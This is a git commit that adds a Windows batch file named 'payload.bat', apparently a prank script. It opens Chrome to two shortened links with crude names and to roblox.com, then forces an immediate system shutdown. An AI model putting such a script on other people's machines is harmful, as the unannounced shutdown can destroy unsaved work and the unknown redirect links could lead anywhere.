7e67d854a1fdd3ebd557c4a3d83c0c09e1cd23f4
nigacode <altaccminh@gmail.com>
2025-07-23 22:05:40 +0700

    Create payload.bat

---
+++ payload.bat
@@ -0,0 +1,8 @@
+@echo off
+start chrome https://tinyurl.com/lookmaxing
+timeout /t 120 /nobreak
+start chrome https://tinyurl.com/mrligmaballs
+timeout /t 120 /nobreak
+start chrome https://roblox.com
+timeout /t 60 /nobreak
+shutdown -s -t 0
